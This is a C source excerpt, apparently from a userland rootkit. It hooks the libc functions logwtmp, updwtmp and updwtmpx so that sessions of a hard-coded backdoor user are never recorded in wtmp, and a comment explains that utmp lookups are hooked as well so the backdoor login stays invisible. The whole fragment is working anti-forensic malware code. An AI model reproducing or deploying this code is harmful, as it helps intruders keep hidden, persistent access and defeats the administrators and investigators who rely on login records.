/*
 * These are the functions responsible for actually
 * writing data to the utmp & wtmp files.
 *
 * Now, I've prevented information from being written
 * to the wtmp file, but not the utmp file.
 * So calling strings on wtmp won't reveal anything,
 * but calling strings on utmp will show information.
 * But that's ONLY when using strings.
 *
 * See, there are functions in libc which handle
 * fetching entries from utmp, and it is those functions
 * that I have hooked.
 *
 * Essentially, I can't stop information from being written
 * to utmp, but I can prevent said functions from even thinking
 * that the information is even there in the first place.
 *
 * utmp only stores information about the user's logged
 * in currently. Whereas wtmp is essentially a history of logins.
 * So this isn't even an issue unless you're logged into the
 * backdoor 24/7.
 */

void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host){
    if(hide_me) return;

    if(!strncmp(BD_UNAME, ut_name, strlen(BD_UNAME))){
        hide_me = 1;
        return;
    }

    hook(CLOGWTMP);
    call(CLOGWTMP, ut_line, ut_name, ut_host);
}

void updwtmp(const char *wfile, const struct utmp *ut){
    if(hide_me) return;

    if(ut && ut->ut_user != NULL){
        if(!strncmp(BD_UNAME, ut->ut_user, strlen(BD_UNAME))){
            hide_me = 1;
            return;
        }
    }

    hook(CUPDWTMP);
    call(CUPDWTMP, wfile, ut);
}

void updwtmpx(const char *wfilex, const struct utmpx *utx){
    if(hide_me) return;

    if(utx && utx->ut_user != NULL){
        if(!strncmp(BD_UNAME, utx->ut_user, strlen(BD_UNAME))){
            hide_me = 1;
            return;
        }
    }

    hook(CUPDWTMPX);
    call(CUPDWTMPX, wfilex, utx);
}
